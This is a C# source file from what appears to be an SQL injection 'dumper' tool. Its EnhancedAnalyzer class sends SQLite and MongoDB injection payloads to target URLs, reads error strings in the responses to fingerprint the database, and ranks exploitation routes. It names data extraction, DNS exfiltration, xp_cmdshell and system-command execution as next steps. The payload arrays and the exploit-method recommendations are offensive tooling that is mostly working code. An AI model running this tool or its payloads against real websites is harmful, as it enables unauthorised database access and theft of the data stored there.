using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using DataBase;

namespace SQLi_Dumper
{
    /// <summary>
    /// Enhanced analyzer with comprehensive SQL injection detection capabilities
    /// </summary>
    public class EnhancedAnalyzer
    {
        private readonly HTTPExt _httpExt;
        private readonly PayloadManager _payloadManager;
        private readonly ErrorSignatures _errorSignatures;
        private readonly DetectionMethods _detectionMethods;
        private readonly CancellationTokenSource _cancellationTokenSource;

        public EnhancedAnalyzer(HTTPExt httpExt)
        {
            _httpExt = httpExt;
            _payloadManager = PayloadManager.Instance;
            _errorSignatures = ErrorSignatures.Instance;
            _detectionMethods = new DetectionMethods(httpExt);
            _cancellationTokenSource = new CancellationTokenSource();
        }

        public class AnalysisResult
        {
            public bool IsVulnerable { get; set; }
            public Types DatabaseType { get; set; }
            public InjectionFormat VectorType { get; set; }
            public List<DetectionMethods.DetectionResult> DetectionResults { get; set; }
            public string BestPayload { get; set; }
            public int OverallConfidence { get; set; }
            public string RecommendedExploitMethod { get; set; }
            public List<string> SupportedFeatures { get; set; }
            public Dictionary<string, object> Metadata { get; set; }

            public AnalysisResult()
            {
                DetectionResults = new List<DetectionMethods.DetectionResult>();
                SupportedFeatures = new List<string>();
                Metadata = new Dictionary<string, object>();
            }
        }

        /// <summary>
        /// Performs comprehensive SQL injection analysis
        /// </summary>
        public async Task<AnalysisResult> PerformComprehensiveAnalysis(string url, AnalysisOptions options = null)
        {
            options = options ?? new AnalysisOptions();
            var result = new AnalysisResult();
            
            try
            {
                // Phase 1: Quick error-based detection
                var quickResults = await PerformQuickAnalysis(url, options);
                result.DetectionResults.AddRange(quickResults);

                // Phase 2: Deep analysis if vulnerability detected or if requested
                if (quickResults.Any(r => r.IsVulnerable) || options.PerformDeepAnalysis)
                {
                    var deepResults = await PerformDeepAnalysis(url, options);
                    result.DetectionResults.AddRange(deepResults);
                }

                // Phase 3: Specialized database detection
                if (options.TestSpecializedDatabases)
                {
                    var specializedResults = await TestSpecializedDatabases(url, options);
                    result.DetectionResults.AddRange(specializedResults);
                }

                // Analyze results and determine best approach
                AnalyzeResults(result);
                
                return result;
            }
            catch (OperationCanceledException)
            {
                result.Metadata["Status"] = "Cancelled";
                return result;
            }
            catch (Exception ex)
            {
                result.Metadata["Error"] = ex.Message;
                return result;
            }
        }

        /// <summary>
        /// Performs quick error-based analysis
        /// </summary>
        private async Task<List<DetectionMethods.DetectionResult>> PerformQuickAnalysis(string url, AnalysisOptions options)
        {
            var results = new List<DetectionMethods.DetectionResult>();
            
            // Test both string and integer injection formats
            var formats = new[] { InjectionFormat.String, InjectionFormat.Integer };

            foreach (var format in formats)
            {
                if (_cancellationTokenSource.Token.IsCancellationRequested)
                    break;

                var errorResults = await _detectionMethods.TestErrorBasedDetection(url, format, _cancellationTokenSource.Token);
                results.AddRange(errorResults);

                // If we found high-confidence results, we can stop here for quick analysis
                if (errorResults.Any(r => r.ConfidenceScore > 90))
                    break;
            }

            return results;
        }

        /// <summary>
        /// Performs deep analysis with all detection methods
        /// </summary>
        private async Task<List<DetectionMethods.DetectionResult>> PerformDeepAnalysis(string url, AnalysisOptions options)
        {
            var results = new List<DetectionMethods.DetectionResult>();
            var formats = new[] { InjectionFormat.String, InjectionFormat.Integer };

            foreach (var format in formats)
            {
                if (_cancellationTokenSource.Token.IsCancellationRequested)
                    break;

                // Time-based detection
                if (options.TestTimeBased)
                {
                    var timeResults = await _detectionMethods.TestTimeBasedDetection(url, format, _cancellationTokenSource.Token);
                    results.AddRange(timeResults);
                }

                // Boolean-based detection
                if (options.TestBooleanBased)
                {
                    var boolResults = await _detectionMethods.TestBooleanBasedDetection(url, format, _cancellationTokenSource.Token);
                    results.AddRange(boolResults);
                }

                // Union-based detection
                if (options.TestUnionBased)
                {
                    var unionResults = await _detectionMethods.TestUnionBasedDetection(url, format, _cancellationTokenSource.Token);
                    results.AddRange(unionResults);
                }

                // Out-of-band detection
                if (options.TestOutOfBand)
                {
                    var oobResults = await _detectionMethods.TestOutOfBandDetection(url, format, _cancellationTokenSource.Token);
                    results.AddRange(oobResults);
                }
            }

            return results;
        }

        /// <summary>
        /// Tests for specialized databases (SQLite, MongoDB, etc.)
        /// </summary>
        private async Task<List<DetectionMethods.DetectionResult>> TestSpecializedDatabases(string url, AnalysisOptions options)
        {
            var results = new List<DetectionMethods.DetectionResult>();

            // Test SQLite
            if (options.TestSQLite)
            {
                var sqliteResults = await TestSQLiteInjection(url);
                results.AddRange(sqliteResults);
            }

            // Test MongoDB (NoSQL)
            if (options.TestMongoDB)
            {
                var mongoResults = await TestMongoDBInjection(url);
                results.AddRange(mongoResults);
            }

            return results;
        }

        /// <summary>
        /// Tests specifically for SQLite injection
        /// </summary>
        private async Task<List<DetectionMethods.DetectionResult>> TestSQLiteInjection(string url)
        {
            var results = new List<DetectionMethods.DetectionResult>();

            // SQLite-specific error patterns
            var sqliteErrorPayloads = new[]
            {
                "' AND CAST(sqlite_version() AS INTEGER) AND 'x'='x",
                "' AND CAST((SELECT name FROM sqlite_master LIMIT 1) AS INTEGER) AND 'x'='x",
                "' AND TYPEOF(1) = 'integer' AND 'x'='x",
                "' AND length(hex(randomblob(1))) = 2 AND 'x'='x"
            };

            foreach (var payload in sqliteErrorPayloads)
            {
                if (_cancellationTokenSource.Token.IsCancellationRequested)
                    break;

                try
                {
                    var testUrl = url.Replace("[t]", payload);
                    var response = await Task.Run(() => _httpExt.QuickGet(testUrl), _cancellationTokenSource.Token);

                    if (response != null)
                    {
                        var responseStr = response.ToString();
                        
                        // Check for SQLite-specific error patterns
                        if (responseStr.Contains("SQLite") || 
                            responseStr.Contains("sqlite") ||
                            responseStr.Contains("no such table: sqlite_master") ||
                            responseStr.Contains("SQL logic error"))
                        {
                            results.Add(new DetectionMethods.DetectionResult
                            {
                                IsVulnerable = true,
                                DatabaseType = Types.Unknown, // SQLite would be a new enum value
                                VectorType = InjectionFormat.String,
                                Method = DetectionMethods.DetectionMethod.ErrorBased,
                                Payload = payload,
                                Evidence = "SQLite-specific error patterns detected",
                                ConfidenceScore = 85,
                                ErrorMessage = "SQLite database detected"
                            });
                        }
                    }
                }
                catch
                {
                    // Continue with next payload
                }
            }

            return results;
        }

        /// <summary>
        /// Tests specifically for MongoDB injection
        /// </summary>
        private async Task<List<DetectionMethods.DetectionResult>> TestMongoDBInjection(string url)
        {
            var results = new List<DetectionMethods.DetectionResult>();

            // MongoDB-specific payloads
            var mongoPayloads = new[]
            {
                "' || '1'=='1",
                "' || true || '",
                "'; return true; var x='",
                "' && this.username && '",
                "' || this.password || '",
                "'; return db.version(); var x='",
                "' || db.stats() || '"
            };

            foreach (var payload in mongoPayloads)
            {
                if (_cancellationTokenSource.Token.IsCancellationRequested)
                    break;

                try
                {
                    var testUrl = url.Replace("[t]", payload);
                    var response = await Task.Run(() => _httpExt.QuickGet(testUrl), _cancellationTokenSource.Token);

                    if (response != null)
                    {
                        var responseStr = response.ToString();
                        
                        // Check for MongoDB-specific patterns
                        if (responseStr.Contains("MongoError") ||
                            responseStr.Contains("MongoDB") ||
                            responseStr.Contains("BSONError") ||
                            responseStr.Contains("ObjectId") ||
                            responseStr.Contains("$where") ||
                            responseStr.Contains("$regex"))
                        {
                            results.Add(new DetectionMethods.DetectionResult
                            {
                                IsVulnerable = true,
                                DatabaseType = Types.Unknown, // MongoDB would be a new enum value
                                VectorType = InjectionFormat.String,
                                Method = DetectionMethods.DetectionMethod.ErrorBased,
                                Payload = payload,
                                Evidence = "MongoDB-specific patterns detected",
                                ConfidenceScore = 80,
                                ErrorMessage = "MongoDB database detected"
                            });
                        }
                    }
                }
                catch
                {
                    // Continue with next payload
                }
            }

            return results;
        }

        /// <summary>
        /// Analyzes detection results and provides recommendations
        /// </summary>
        private void AnalyzeResults(AnalysisResult result)
        {
            var vulnerableResults = result.DetectionResults.Where(r => r.IsVulnerable).ToList();
            
            if (vulnerableResults.Count == 0)
            {
                result.IsVulnerable = false;
                result.OverallConfidence = 0;
                result.RecommendedExploitMethod = "No vulnerabilities detected";
                return;
            }

            // Determine overall vulnerability status
            result.IsVulnerable = true;

            // Find the best result (highest confidence)
            var bestResult = vulnerableResults.OrderByDescending(r => r.ConfidenceScore).First();
            result.DatabaseType = bestResult.DatabaseType;
            result.VectorType = bestResult.VectorType;
            result.BestPayload = bestResult.Payload;
            result.OverallConfidence = bestResult.ConfidenceScore;

            // Recommend exploitation method
            switch (bestResult.Method)
            {
                case DetectionMethods.DetectionMethod.ErrorBased:
                    result.RecommendedExploitMethod = "Error-based injection (fastest data extraction)";
                    result.SupportedFeatures.AddRange(new[] { "Database enumeration", "Table enumeration", "Data extraction" });
                    break;

                case DetectionMethods.DetectionMethod.UnionBased:
                    result.RecommendedExploitMethod = "Union-based injection (efficient data extraction)";
                    result.SupportedFeatures.AddRange(new[] { "Database enumeration", "Table enumeration", "Data extraction", "File operations" });
                    break;

                case DetectionMethods.DetectionMethod.TimeBased:
                    result.RecommendedExploitMethod = "Time-based blind injection (slower but reliable)";
                    result.SupportedFeatures.AddRange(new[] { "Boolean queries", "Character-by-character extraction" });
                    break;

                case DetectionMethods.DetectionMethod.BooleanBased:
                    result.RecommendedExploitMethod = "Boolean-based blind injection (reliable for data extraction)";
                    result.SupportedFeatures.AddRange(new[] { "True/false queries", "Character-by-character extraction" });
                    break;

                case DetectionMethods.DetectionMethod.OutOfBand:
                    result.RecommendedExploitMethod = "Out-of-band injection (requires external infrastructure)";
                    result.SupportedFeatures.AddRange(new[] { "DNS exfiltration", "HTTP callbacks" });
                    break;
            }

            // Add database-specific features
            switch (result.DatabaseType)
            {
                case Types.MySQL_With_Error:
                case Types.MySQL_No_Error:
                    result.SupportedFeatures.AddRange(new[] { "File operations", "UDF execution", "System commands" });
                    break;

                case Types.MSSQL_With_Error:
                case Types.MSSQL_No_Error:
                    result.SupportedFeatures.AddRange(new[] { "xp_cmdshell", "OLE automation", "CLR integration" });
                    break;

                case Types.Oracle_With_Error:
                case Types.Oracle_No_Error:
                    result.SupportedFeatures.AddRange(new[] { "Java stored procedures", "PL/SQL", "External procedures" });
                    break;

                case Types.PostgreSQL_With_Error:
                case Types.PostgreSQL_No_Error:
                    result.SupportedFeatures.AddRange(new[] { "Copy command", "Large objects", "Extensions" });
                    break;
            }

            // Add metadata
            result.Metadata["TotalTestsRun"] = result.DetectionResults.Count;
            result.Metadata["VulnerableTests"] = vulnerableResults.Count;
            result.Metadata["DetectionMethods"] = vulnerableResults.Select(r => r.Method.ToString()).Distinct().ToList();
            result.Metadata["AverageResponseTime"] = vulnerableResults.Average(r => r.ResponseTime);
            result.Metadata["DatabaseFingerprint"] = GenerateDatabaseFingerprint(vulnerableResults);
        }

        /// <summary>
        /// Generates a database fingerprint based on detection results
        /// </summary>
        private string GenerateDatabaseFingerprint(List<DetectionMethods.DetectionResult> results)
        {
            var fingerprint = new Dictionary<string, int>();

            foreach (var result in results)
            {
                var dbTypeStr = result.DatabaseType.ToString();
                if (!fingerprint.ContainsKey(dbTypeStr))
                    fingerprint[dbTypeStr] = 0;
                fingerprint[dbTypeStr] += result.ConfidenceScore;
            }

            var bestMatch = fingerprint.OrderByDescending(kvp => kvp.Value).First();
            return $"{bestMatch.Key} (confidence: {bestMatch.Value})";
        }

        /// <summary>
        /// Cancels the current analysis
        /// </summary>
        public void CancelAnalysis()
        {
            _cancellationTokenSource.Cancel();
        }

        /// <summary>
        /// Disposes resources
        /// </summary>
        public void Dispose()
        {
            _cancellationTokenSource?.Dispose();
        }
    }

    /// <summary>
    /// Options for controlling analysis behavior
    /// </summary>
    public class AnalysisOptions
    {
        public bool PerformDeepAnalysis { get; set; } = false;
        public bool TestTimeBased { get; set; } = true;
        public bool TestBooleanBased { get; set; } = true;
        public bool TestUnionBased { get; set; } = true;
        public bool TestOutOfBand { get; set; } = false;
        public bool TestSpecializedDatabases { get; set; } = true;
        public bool TestSQLite { get; set; } = true;
        public bool TestMongoDB { get; set; } = true;
        public bool UseEncodedPayloads { get; set; } = false;
        public List<string> EncodingMethods { get; set; } = new List<string>();
        public int MaxPayloadsPerCategory { get; set; } = 10;
        public int TimeoutPerRequest { get; set; } = 30000; // 30 seconds
        
        public AnalysisOptions()
        {
            EncodingMethods = new List<string> { "url", "mixed_case" };
        }
    }
}